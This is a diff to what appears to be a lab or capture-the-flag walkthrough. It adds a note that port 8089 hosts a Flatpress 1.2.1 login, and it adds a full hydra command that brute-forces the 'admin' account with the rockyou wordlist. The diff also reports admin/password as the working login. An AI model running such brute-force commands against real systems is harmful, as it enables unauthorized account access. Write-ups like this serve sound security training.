@@ -22,6 +22,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ==🟡Available ports 22,80,8089 ==
 
+
+On port 8089, there is a login site for Flatpress version 1.2.1. Let's try to brute force some known passwords combinations for the username, "admin."
+
+	hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8089 192.168.XXX.XXX http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
+	
 Hydra Scans:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-13 20:45:31  
 
@@ -40,7 +45,9 @@ login: admin   password: rockyou
 login: admin   password: daniel  
 login: admin   password: babygirl
 
-Numerous password login credentials found for login. 
+We have found numerous login credentials. 
+
+After attempting the above credentials, the successful login was "admin/password."
 
 # Service Enumeration
 
